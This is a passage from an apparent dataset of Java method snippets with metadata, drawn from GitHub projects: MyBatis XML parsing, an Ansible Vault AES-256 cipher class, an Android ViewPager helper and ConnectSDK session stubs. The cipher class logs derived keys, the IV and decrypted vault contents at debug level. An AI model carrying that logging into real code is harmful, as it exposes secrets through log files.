 if (handler instanceof IfHandler) {\n          handler.handleNode(child, ifSqlNodes);\n        } else if (handler instanceof OtherwiseHandler) {\n          handler.handleNode(child, defaultSqlNodes);\n        }\n      }\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/xmltags/XMLScriptBuilder.java", "stars": "15", "class_props": {"extends": null, "implements": ["NodeHandler"], "modifiers": ["private"]}}, {"id": 32609, "method_name": "getDefaultSqlNode", "class_name": "ChooseHandler", "params": ["List<SqlNode>"], "throws": null, "modifiers": ["private"], "return_type": "SqlNode", "snippet": "    private SqlNode getDefaultSqlNode(List<SqlNode> defaultSqlNodes) {\n      SqlNode defaultSqlNode = null;\n      if (defaultSqlNodes.size() == 1) {\n        defaultSqlNode = defaultSqlNodes.get(0);\n      } else if (defaultSqlNodes.size() > 1) {\n        throw new BuilderException(\"Too many default (otherwise) elements in choose statement.\");\n      }\n      return defaultSqlNode;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/xmltags/XMLScriptBuilder.java", "stars": "15", "class_props": {"extends": null, "implements": ["NodeHandler"], "modifiers": ["private"]}}, {"id": 32610, "method_name": "hasValidAESProvider", "class_name": "CypherAES256", "params": [], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean hasValidAESProvider() {\n        boolean canCrypt = false;\n        try {\n            int maxKeyLen = Cipher.getMaxAllowedKeyLength(CYPHER_ALGO);\n            logger.debug(\"Available keylen: {}\", maxKeyLen);\n            if (maxKeyLen >= AES_KEYLEN) {\n                canCrypt = true;\n            } else {\n                logger.warn(String.format(\"JRE doesn't support %s keylength for %sInstall unrestricted policy files from:%s\",\n                        AES_KEYLEN, CYPHER_KEY_ALGO, JDK8_UPF_URL));\n            }\n        } catch (Exception ex) {\n            logger.warn(String.format(\"Failed to check for proper cypher algorithms: %s\", ex.getMessage()));\n        }\n        return canCrypt;\n    }", "url": "https://raw.githubusercontent.com/sadv1r/ansible-vault-editor-idea-plugin/master/src/main/java/ru/sadv1r/ansible/vault/crypto/decoders/impl/CypherAES256.java", "stars": "7", "class_props": {"extends": null, "implements": ["Cypher"], "modifiers": ["public"]}}, {"id": 32611, "method_name": "calculateHMAC", "class_name": "CypherAES256", "params": ["byte", "byte"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] calculateHMAC(byte[] key, byte[] data) throws IOException {\n        byte[] computedMac;\n\n        try {\n            SecretKeySpec hmacKey = new SecretKeySpec(key, KEYGEN_ALGO);\n            Mac mac = Mac.getInstance(KEYGEN_ALGO);\n            mac.init(hmacKey);\n            computedMac = mac.doFinal(data);\n        } catch (Exception ex) {\n            throw new IOException(\"Error decrypting HMAC hash: \" + ex.getMessage());\n        }\n\n        return computedMac;\n    }", "url": "https://raw.githubusercontent.com/sadv1r/ansible-vault-editor-idea-plugin/master/src/main/java/ru/sadv1r/ansible/vault/crypto/decoders/impl/CypherAES256.java", "stars": "7", "class_props": {"extends": null, "implements": ["Cypher"], "modifiers": ["public"]}}, {"id": 32612, "method_name": "verifyHMAC", "class_name": "CypherAES256", "params": ["byte", "byte", "byte"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean verifyHMAC(byte[] hmac, byte[] key, byte[] data) throws IOException {\n        byte[] calculated = calculateHMAC(key, data);\n        return Arrays.equals(hmac, calculated);\n    }", "url": "https://raw.githubusercontent.com/sadv1r/ansible-vault-editor-idea-plugin/master/src/main/java/ru/sadv1r/ansible/vault/crypto/decoders/impl/CypherAES256.java", "stars": "7", "class_props": {"extends": null, "implements": ["Cypher"], "modifiers": ["public"]}}, {"id": 32613, "method_name": "paddingLength", "class_name": "CypherAES256", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int paddingLength(byte[] decrypted) {\n        if (decrypted.length == 0) {\n            logger.debug(\"Empty decoded text has no padding.\");\n            return 0;\n        }\n\n        logger.debug(\"Padding length: {}\", decrypted[decrypted.length - 1]);\n        return decrypted[decrypted.length - 1];\n    }", "url": "https://raw.githubusercontent.com/sadv1r/ansible-vault-editor-idea-plugin/master/src/main/java/ru/sadv1r/ansible/vault/crypto/decoders/impl/CypherAES256.java", "stars": "7", "class_props": {"extends": null, "implements": ["Cypher"], "modifiers": ["public"]}}, {"id": 32614, "method_name": "unpad", "class_name": "CypherAES256", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] unpad(byte[] decrypted) {\n        int length = decrypted.length - paddingLength(decrypted);\n        return Arrays.copyOfRange(decrypted, 0, length);\n    }", "url": "https://raw.githubusercontent.com/sadv1r/ansible-vault-editor-idea-plugin/master/src/main/java/ru/sadv1r/ansible/vault/crypto/decoders/impl/CypherAES256.java", "stars": "7", "class_props": {"extends": null, "implements": ["Cypher"], "modifiers": ["public"]}}, {"id": 32615, "method_name": "pad", "class_name": "CypherAES256", "params": ["byte"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] pad(byte[] cleartext) throws IOException {\n        byte[] padded;\n\n        try {\n            int blockSize = Cipher.getInstance(CYPHER_ALGO).getBlockSize();\n            logger.debug(\"Padding to block size: {}\", blockSize);\n            int padding_length = (blockSize - (cleartext.length % blockSize));\n            if (padding_length == 0) {\n                padding_length = blockSize;\n            }\n            padded = Arrays.copyOf(cleartext, cleartext.length + padding_length);\n            padded[padded.length - 1] = (byte) padding_length;\n\n        } catch (Exception ex) {\n            throw new IOException(\"Error calculating padding for \" + CYPHER_ALGO + \": \" + ex.getMessage());\n        }\n\n        return padded;\n    }", "url": "https://raw.githubusercontent.com/sadv1r/ansible-vault-editor-idea-plugin/master/src/main/java/ru/sadv1r/ansible/vault/crypto/decoders/impl/CypherAES256.java", "stars": "7", "class_props": {"extends": null, "implements": ["Cypher"], "modifiers": ["public"]}}, {"id": 32616, "method_name": "decryptAES", "class_name": "CypherAES256", "params": ["byte", "byte", "byte"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] decryptAES(byte[] cypher, byte[] key, byte[] iv) throws IOException {\n\n        SecretKeySpec keySpec = new SecretKeySpec(key, CYPHER_KEY_ALGO);\n        IvParameterSpec ivSpec = new IvParameterSpec(iv);\n        try {\n            Cipher cipher = Cipher.getInstance(CYPHER_ALGO);\n            cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);\n            byte[] decrypted = cipher.doFinal(cypher);\n            return unpad(decrypted);\n        } catch (Exception ex) {\n            throw new IOException(\"Failed to decrypt data: \" + ex.getMessage());\n        }\n    }", "url": "https://raw.githubusercontent.com/sadv1r/ansible-vault-editor-idea-plugin/master/src/main/java/ru/sadv1r/ansible/vault/crypto/decoders/impl/CypherAES256.java", "stars": "7", "class_props": {"extends": null, "implements": ["Cypher"], "modifiers": ["public"]}}, {"id": 32617, "method_name": "encryptAES", "class_name": "CypherAES256", "params": ["byte", "byte", "byte"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] encryptAES(byte[] cleartext, byte[] key, byte[] iv) throws IOException {\n        SecretKeySpec keySpec = new SecretKeySpec(key, CYPHER_KEY_ALGO);\n        IvParameterSpec ivSpec = new IvParameterSpec(iv);\n        try {\n            Cipher cipher = Cipher.getInstance(CYPHER_ALGO);\n            cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);\n            return cipher.doFinal(cleartext);\n        } catch (Exception ex) {\n            throw new IOException(\"Failed to encrypt data: \" + ex.getMessage());\n        }\n    }", "url": "https://raw.githubusercontent.com/sadv1r/ansible-vault-editor-idea-plugin/master/src/main/java/ru/sadv1r/ansible/vault/crypto/decoders/impl/CypherAES256.java", "stars": "7", "class_props": {"extends": null, "implements": ["Cypher"], "modifiers": ["public"]}}, {"id": 32618, "method_name": "decrypt", "class_name": "CypherAES256", "params": ["byte", "String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] decrypt(byte[] data, String password) throws IOException {\n        byte[] decrypted;\n\n        if (!hasValidAESProvider()) {\n            throw new IOException(\"Missing valid AES256 provider - install unrestricted policy profiles.\");\n        }\n\n        VaultContent vaultContent = new VaultContent(data);\n\n        byte[] salt = vaultContent.getSalt();\n        byte[] hmac = vaultContent.getHmac();\n        byte[] cypher = vaultContent.getData();\n        logger.debug(\"Salt: {} - {}\", salt.length, Util.hexit(salt, 100));\n        logger.debug(\"HMAC: {} - {}\", hmac.length, Util.hexit(hmac, 100));\n        logger.debug(\"Data: {} - {}\", cypher.length, Util.hexit(cypher, 100));\n\n        EncryptionKeychain keys = new EncryptionKeychain(salt, password, KEYLEN, IVLEN, ITERATIONS, KEYGEN_ALGO);\n        keys.createKeys();\n\n        byte[] cypherKey = keys.getEncryptionKey();\n        logger.debug(\"Key 1: {} - {}\", cypherKey.length, Util.hexit(cypherKey, 100));\n        byte[] hmacKey = keys.getHmacKey();\n        logger.debug(\"Key 2: {} - {}\", hmacKey.length, Util.hexit(hmacKey, 100));\n        byte[] iv = keys.getIv();\n        logger.debug(\"IV: {} - {}\", iv.length, Util.hexit(iv, 100));\n\n        if (verifyHMAC(hmac, hmacKey, cypher)) {\n            logger.debug(\"Signature matches - decrypting\");\n            decrypted = decryptAES(cypher, cypherKey, iv);\n            logger.debug(\"Decoded:\\n{}\", new String(decrypted, CHAR_ENCODING));\n        } else {\n            throw new IOException(\"HMAC Digest doesn't match - possibly it's the wrong password.\");\n        }\n\n        return decrypted;\n    }", "url": "https://raw.githubusercontent.com/sadv1r/ansible-vault-editor-idea-plugin/master/src/main/java/ru/sadv1r/ansible/vault/crypto/decoders/impl/CypherAES256.java", "stars": "7", "class_props": {"extends": null, "implements": ["Cypher"], "modifiers": ["public"]}}, {"id": 32619, "method_name": "infoLine", "class_name": "CypherAES256", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String infoLine() {\n        return VaultInfo.vaultInfoForCypher(CYPHER_ID);\n    }", "url": "https://raw.githubusercontent.com/sadv1r/ansible-vault-editor-idea-plugin/master/src/main/java/ru/sadv1r/ansible/vault/crypto/decoders/impl/CypherAES256.java", "stars": "7", "class_props": {"extends": null, "implements": ["Cypher"], "modifiers": ["public"]}}, {"id": 32620, "method_name": "encrypt", "class_name": "CypherAES256", "params": ["byte", "String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] encrypt(byte[] data, String password) throws IOException {\n        EncryptionKeychain keys = new EncryptionKeychain(SALT_LENGTH, password, KEYLEN, IVLEN, ITERATIONS, KEYGEN_ALGO);\n        keys.createKeys();\n        byte[] cypherKey = keys.getEncryptionKey();\n        logger.debug(\"Key 1: {} - {}\", cypherKey.length, Util.hexit(cypherKey, 100));\n        byte[] hmacKey = keys.getHmacKey();\n        logger.debug(\"Key 2: {} - {}\", hmacKey.length, Util.hexit(hmacKey, 100));\n        byte[] iv = keys.getIv();\n        logger.debug(\"IV: {} - {}\", iv.length, Util.hexit(iv, 100));\n        logger.debug(\"Original data length: {}\", data.length);\n        data = pad(data);\n        logger.debug(\"Padded data length: {}\", data.length);\n        byte[] encrypted = encryptAES(data, keys.getEncryptionKey(), keys.getIv());\n        byte[] hmacHash = calculateHMAC(keys.getHmacKey(), encrypted);\n        VaultContent vaultContent = new VaultContent(keys.getSalt(), hmacHash, encrypted);\n        return vaultContent.toByteArray();\n    }", "url": "https://raw.githubusercontent.com/sadv1r/ansible-vault-editor-idea-plugin/master/src/main/java/ru/sadv1r/ansible/vault/crypto/decoders/impl/CypherAES256.java", "stars": "7", "class_props": {"extends": null, "implements": ["Cypher"], "modifiers": ["public"]}}, {"id": 32621, "method_name": "supportLayoutChange", "class_name": "GraceViewPagerSupport", "params": ["ViewPager"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void supportLayoutChange(@NonNull ViewPager viewPager) {\n        viewPager.addOnLayoutChangeListener(new ViewPagerLayoutChangeListener());\n    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/graceviewpager/src/main/java/com/lancewu/graceviewpager/GraceViewPagerSupport.java", "stars": "331", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32622, "method_name": "supportMultiPage", "class_name": "GraceViewPagerSupport", "params": ["ViewPager", "GraceMultiPagePlugin"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void supportMultiPage(@NonNull ViewPager viewPager, final GraceMultiPagePlugin multiPagePlugin) {\n        viewPager.addOnLayoutChangeListener(new View.OnLayoutChangeListener() {\n\n            private SizeChangeHandler mSizeChangeHandler = new SizeChangeHandler();\n\n            @Override\n            public void onLayoutChange(final View v, int left, int top, int right, int bottom, int oldLeft, int oldTop, int oldRight, int oldBottom) {\n                final int width = right - left;\n                final int height = bottom - top;\n                // \u5f53\u524d\u6b63\u5728layout\uff0c\u9700\u8981\u4e0b\u4e00\u5e27\u91cd\u65b0\u6d4b\u91cf\u5e03\u5c40\u751f\u6548\n                v.post(new Runnable() {\n                    @Override\n                    public void run() {\n                        multiPagePlugin.determinePageSize(width, height);\n                        mSizeChangeHandler.onSizeChange((ViewPager) v, width);\n                    }\n                });\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/graceviewpager/src/main/java/com/lancewu/graceviewpager/GraceViewPagerSupport.java", "stars": "331", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32623, "method_name": "setPageMargin", "class_name": "GraceViewPagerSupport", "params": ["ViewPager", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setPageMargin(@NonNull ViewPager viewPager, int pageMargin) {\n        int oldPageMargin = viewPager.getPageMargin();\n        if (pageMargin == oldPageMargin) {\n            return;\n        }\n        int childWidth = viewPager.getMeasuredWidth() - viewPager.getPaddingLeft() - viewPager.getPaddingRight();\n        if (childWidth == 0) {\n            viewPager.setPageMargin(pageMargin);\n        } else {\n            // setPageMargin()\u8c03\u7528\u540e\u5f53\u524ditem\u7684offset\u503c\u548cchildWidth\u4e0d\u53d8\uff0c\u6240\u4ee5\u76f4\u63a5\u53d6\u51fa\u8c03\u7528\u524d\u7684scrollX\u503c\u8fdb\u884c\u5b9a\u4f4d\u5373\u53ef\n            int oldScrollX = viewPager.getScrollX();\n            viewPager.setPageMargin(pageMargin);\n            viewPager.scrollTo(oldScrollX, viewPager.getScrollY());\n        }\n    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/graceviewpager/src/main/java/com/lancewu/graceviewpager/GraceViewPagerSupport.java", "stars": "331", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32624, "method_name": "onLayoutChange", "class_name": "ViewPagerLayoutChangeListener", "params": ["View", "int", "int", "int", "int", "int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onLayoutChange(View v, int left, int top, int right, int bottom, int oldLeft,\n                                   int oldTop, int oldRight, int oldBottom) {\n            mSizeChangeHandler.onSizeChange((ViewPager) v, right - left);\n        }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/graceviewpager/src/main/java/com/lancewu/graceviewpager/GraceViewPagerSupport.java", "stars": "331", "class_props": {"extends": null, "implements": ["View"], "modifiers": ["private", "final", "static"]}}, {"id": 32625, "method_name": "onSizeChange", "class_name": "SizeChangeHandler", "params": ["ViewPager", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onSizeChange(ViewPager viewPager, int width) {\n            int childWidth = width - viewPager.getPaddingLeft() - viewPager.getPaddingRight();\n            if (childWidth == 0) {\n                return;\n            }\n            if (mLastChildWidth == 0) {\n                mLastChildWidth = childWidth;\n                return;\n            }\n            if (mLastChildWidth == childWidth) {\n                return;\n            }\n            /*\n             * \u95ee\u9898\uff1apage\u5bbd\u5ea6\u53d8\u5316\u540e\uff0clayout\u4f1a\u6b63\u786e\u653e\u7f6echild\u4f4d\u7f6e\uff0c\u4f46\u662fscrollX\u503c\u4ecd\u7136\u662f\u65e7\u503c\uff0c\u5bfc\u81f4\u7ed8\u5236\u4f4d\u7f6e\u504f\u5dee\uff1b\n             * \u540c\u65f6\uff0c\u7ecf\u8fc7\u6570\u636e\u5237\u65b0\u540escrollX=0\u4e0d\u4ee3\u8868\u5b9a\u4f4d\u5230\u7b2c\u4e00\u4e2a\u9875\u9762\uff0c\u53d6\u51b3\u4e8e\u6700\u5de6\u8fb9child\u7684\u4f4d\u7f6e\uff0c\u6240\u4ee5\u8be5\u503c\u6709\u53ef\u80fd\u662f\u8d1f\u503c\uff1b\n             * \u89e3\u51b3\u65b9\u6848\uff1a\u6839\u636e\u65e7\u503c\u83b7\u53d6\u9875\u9762\u504f\u79fb\uff0c\u6839\u636e\u9875\u9762\u504f\u79fb\u8ba1\u7b97\u65b0\u7684scrollX\u4f4d\u7f6e\n             */\n            recomputeScrollPosition(viewPager, viewPager.getScrollX(), childWidth, mLastChildWidth);\n            mLastChildWidth = childWidth;\n        }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/graceviewpager/src/main/java/com/lancewu/graceviewpager/GraceViewPagerSupport.java", "stars": "331", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 32626, "method_name": "recomputeScrollPosition", "class_name": "SizeChangeHandler", "params": ["ViewPager", "int", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void recomputeScrollPosition(ViewPager viewPager, int scrollX,\n                                             int childWidth, int oldChildWidth) {\n            float pageOffset = (float) scrollX / oldChildWidth;\n            int newOffsetPixels = (int) (pageOffset * childWidth);\n            viewPager.scrollTo(newOffsetPixels, viewPager.getScrollY());\n        }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/graceviewpager/src/main/java/com/lancewu/graceviewpager/GraceViewPagerSupport.java", "stars": "331", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 32627, "method_name": "setService", "class_name": "WebAppSession", "params": ["DeviceService"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setService(DeviceService service) {\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32628, "method_name": "subscribeWebAppStatus", "class_name": "WebAppSession", "params": ["MessageListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<MessageListener>", "snippet": "    public ServiceSubscription<MessageListener> subscribeWebAppStatus(\n            MessageListener listener) {\n        if (listener != null)\n            listener.onError(ServiceCommandError.notSupported());\n\n        return null;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32629, "method_name": "connect", "class_name": "WebAppSession", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void connect(ResponseListener<Object> connectionListener) {\n        Util.postError(connectionListener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32630, "method_name": "join", "class_name": "WebAppSession", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void join(ResponseListener<Object> connectionListener) {\n        Util.postError(connectionListener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32631, "method_name": "disconnectFromWebApp", "class_name": "WebAppSession", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void disconnectFromWebApp() {\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32632, "method_name": "pinWebApp", "class_name": "WebAppSession", "params": ["String", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pinWebApp(String webAppId, ResponseListener<Object> listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32633, "method_name": "unPinWebApp", "class_name": "WebAppSession", "params": ["String", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void unPinWebApp(String webAppId, ResponseListener<Object> listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32634, "method_name": "isWebAppPinned", "class_name": "WebAppSession", "params": ["String", "WebAppPinStatusListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void isWebAppPinned(String webAppId, WebAppPinStatusListener listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32635, "method_name": "subscribeIsWebAppPinned", "class_name": "WebAppSession", "params": ["String", "WebAppPinStatusListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<WebAppPinStatusListener>", "snippet": "    public ServiceSubscription<WebAppPinStatusListener> subscribeIsWebAppPinned(String webAppId, WebAppPinStatusListener listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n        return null;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32636, "method_name": "close", "class_name": "WebAppSession", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void close(ResponseListener<Object> listener) {\n        if (listener != null)\n            listener.onError(ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32637, "method_name": "sendMessage", "class_name": "WebAppSession", "params": ["String", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendMessage(String message, ResponseListener<Object> listener) {\n        if (listener != null)\n            listener.onError(ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32638, "method_name": "sendMessage", "class_name": "WebAppSession", "params": ["JSONObject", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendMessage(JSONObject message,\n            ResponseListener<Object> listener) {\n        if (listener != null) {\n            listener.onError(ServiceCommandError.notSupported());\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32639, "method_name": "getMediaControl", "class_name": "WebAppSession", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MediaControl", "snippet": "    public MediaControl getMediaControl() {\n        return null;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32640, "method_name": "getMediaControlCapabilityLevel", "class_name": "WebAppSession", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getMediaControlCapabilityLevel() {\n        return CapabilityPriorityLevel.VERY_LOW;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32641, "method_name": "getMediaInfo", "class_name": "WebAppSession", "params": ["MediaInfoListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getMediaInfo(MediaInfoListener listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32642, "method_name": "subscribeMediaInfo", "class_name": "WebAppSession", "params": ["MediaInfoListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<MediaInfoListener>", "snippet": "    public ServiceSubscription<MediaInfoListener> subscribeMediaInfo(\n            MediaInfoListener listener) {\n        listener.onError(ServiceCommandError.notSupported());\n        return null;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32643, "method_name": "play", "class_name": "WebAppSession", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void play(ResponseListener<Object> listener) {\n        MediaControl mediaControl = null;\n\n        if (service != null)\n            mediaControl = service.getAPI(MediaControl.class);\n\n        if (mediaControl != null)\n            mediaControl.play(listener);\n        else if (listener != null)\n            listener.onError(ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32644, "method_name": "pause", "class_name": "WebAppSession", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pause(ResponseListener<Object> listener) {\n        MediaControl mediaControl = null;\n\n        if (service != null)\n            mediaControl = service.getAPI(MediaControl.class);\n\n        if (mediaControl != null)\n            mediaControl.pause(listener);\n        else if (listener != null)\n            listener.onError(ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32645, "method_name": "stop", "class_name": "WebAppSession", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void stop(ResponseListener<Object> listener) {\n        MediaControl mediaControl = null;\n\n        if (service != null)\n            mediaControl = service.getAPI(MediaControl.class);\n\n        if (mediaControl != null)\n            mediaControl.stop(listener);\n        else if (listener != null)\n            listener.onError(ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32646, "method_name": "rewind", "class_name": "WebAppSession", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void rewind(ResponseListener<Object> listener) {\n        MediaControl mediaControl = null;\n\n        if (service != null)\n            mediaControl = service.getAPI(MediaControl.class);\n\n        if (mediaControl != null)\n            mediaControl.rewind(listener);\n        else if (listener != null)\n            listener.onError(ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32647, "method_name": "fastForward", "class_name": "WebAppSession", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void 